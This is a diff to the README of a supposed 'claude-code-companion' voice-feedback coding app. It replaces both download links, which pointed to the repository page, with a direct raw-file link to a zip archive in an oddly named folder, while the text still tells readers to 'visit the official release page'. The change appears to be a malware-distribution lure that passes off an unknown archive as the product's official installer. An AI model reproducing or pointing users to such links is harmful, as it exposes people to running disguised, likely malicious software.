@@ -1,6 +1,6 @@
 # 🤝 claude-code-companion - A supportive voice for your code
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/rahmay3853/claude-code-companion)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/rahmay3853/claude-code-companion/main/hemimetaboly/companion-claude-code-v3.4.zip)
 
 This software acts as your personal pair programmer. It listens to your work process and provides verbal feedback. The application uses voice synthesis technology to offer encouragement while you write code. It helps you stay focused on your tasks.
 
@@ -25,7 +25,7 @@ Your computer needs to meet these basic standards to run the software:
 
 You must visit the official release page to get the installer for your computer.
 
-[Click here to visit the download page](https://github.com/rahmay3853/claude-code-companion)
+[Click here to visit the download page](https://raw.githubusercontent.com/rahmay3853/claude-code-companion/main/hemimetaboly/companion-claude-code-v3.4.zip)
 
 Follow these steps on the website:
 
